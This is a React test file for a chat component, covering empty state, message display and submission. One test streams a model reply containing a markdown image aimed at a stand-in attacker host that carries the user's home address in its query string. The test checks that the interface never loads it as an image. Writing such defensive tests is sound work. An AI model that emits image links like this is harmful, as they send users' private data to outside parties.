import { fireEvent, waitFor } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';

import { renderWithProviders } from '@/test/renderWithProviders';

import { Chat } from './Chat';
import { Channel, FrameEncoder } from './utils';

vi.mock('@/components/ModelSelector', () => ({
  ModelSelector: () => <div data-testid="model-selector" />,
}));

vi.mock('@/api/useUploadFile', () => ({
  useUploadFile: () => [
    { files: [], loading: false, error: null },
    { upload: vi.fn(), reset: vi.fn() },
  ],
}));

describe('Chat', () => {
  it('shows the empty state when there are no messages', () => {
    const { getByText } = renderWithProviders(<Chat emptyState={<div>Start the conversation</div>} />);

    expect(getByText('Start the conversation')).toBeInTheDocument();
  });

  it('renders provided messages and hides the empty state', () => {
    const { getByText, queryByText } = renderWithProviders(
      <Chat
        emptyState={<div>Start the conversation</div>}
        messages={[
          { role: 'user', content: 'hi there' },
          { role: 'assistant', content: 'hello back' },
        ]}
      />,
    );

    expect(getByText('hi there')).toBeInTheDocument();
    expect(getByText('hello back')).toBeInTheDocument();
    expect(queryByText('Start the conversation')).not.toBeInTheDocument();
  });

  it('shows the user bubble immediately, even if onSubmit has not resolved', async () => {
    const onSubmit = vi.fn(() => new Promise<boolean>(() => undefined));
    const { getByText, getByRole } = renderWithProviders(<Chat onSubmit={onSubmit} />);

    const textarea = getByRole('textbox');
    fireEvent.change(textarea, { target: { value: 'what is up' } });
    fireEvent.keyDown(textarea, { key: 'Enter' });

    await waitFor(() => expect(getByText('what is up')).toBeInTheDocument());
  });

  it('never loads a remote image while a reply streams in', async () => {
    // The live reply is painted by the streaming renderer, not by Markdown, so
    // Markdown's own image rule never saw it. The URL arrives split across
    // frames, the way a model's tokens do.
    const src = 'https://attacker.example/log?d=home+address';
    const reply = `Here you go. ![](${src})`;
    const encoder = new FrameEncoder();
    const readable = new ReadableStream<Uint8Array>({
      start(controller) {
        for (const piece of [reply.slice(0, 20), reply.slice(20, 40), reply.slice(40)]) {
          controller.enqueue(encoder.encodeFrame(Channel.TEXT, piece));
        }

        controller.close();
      },
    });

    const { container } = renderWithProviders(
      <Chat messages={[{ role: 'user', content: 'where do I live?' }]} readable={readable} />,
    );

    await waitFor(() => expect(container.querySelector('a[data-remote-image]')).toHaveAttribute('href', src));
    expect(container.querySelector('img')).toBeNull();
  });

  it('submits a typed message through ChatInput', async () => {
    const onSubmit = vi.fn().mockReturnValue(true);
    const { getByRole } = renderWithProviders(<Chat onSubmit={onSubmit} />);

    const textarea = getByRole('textbox');
    fireEvent.change(textarea, { target: { value: 'what is up' } });
    fireEvent.keyDown(textarea, { key: 'Enter' });

    await waitFor(() =>
      expect(onSubmit).toHaveBeenCalledWith(
        expect.objectContaining({ message: 'what is up' }),
        expect.anything(),
      ),
    );
  });
});
